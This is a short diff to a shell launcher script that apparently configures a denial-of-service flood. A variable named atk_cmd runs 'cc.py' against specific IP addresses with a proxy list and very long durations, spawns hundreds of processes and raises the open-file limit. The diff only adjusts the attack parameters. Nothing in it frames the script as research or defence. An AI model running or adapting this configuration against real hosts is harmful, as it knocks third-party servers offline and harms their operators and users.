@@ -6,11 +6,11 @@
 #  Lastly run this script
 #
 #the command you want to exec
-atk_cmd="python3 cc.py -url http://103.179.187.73 -f proxy4.txt -v 5 -s 999999 14445"
+atk_cmd="python3 cc.py -url http://103.179.187.73 -f proxy4.txt -v 5 -s 999999"
 #atk_cmd="python3 cc.py -url http://103.195.237.42 -v 5 -s 99999999 14445"
 
 #number of process that you want
-process=500
+process=300
 
 #change the system limit
 ulimit -n 999999
